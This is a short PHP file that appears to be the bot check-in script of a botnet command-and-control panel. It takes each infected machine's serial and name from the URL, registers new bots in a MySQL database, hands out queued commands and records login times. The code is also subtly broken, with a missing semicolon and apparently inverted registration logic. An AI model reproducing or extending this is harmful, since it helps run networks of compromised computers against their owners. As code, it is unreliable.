<?php
//error_reporting(E_ALL);
include("config.php");
include("cANDcfunc.php")

$serial=$_GET['serial'];
$name=$_GET['name'];
$conn=mysql_connect($server,$user,$dbpwd) or die('can´t connect');
$db=mysql_select_db($dbname)or die('wrong db');
$b00l=IsBotInDB($serial,$name);

if ($b00l == FALSE) {    
	$id=GetBotID($serial,$name);
	$command="wait";
	if(isset($_GET['meta'])){
		$b00l=SetBotCommand("id=" . $id, $command);
	}
	GetBotCmd($id);
	SetLoginDate($id);
} elseif ($b00l != FALSE) {
	AddBotToDB($serial,$name);
}

?>
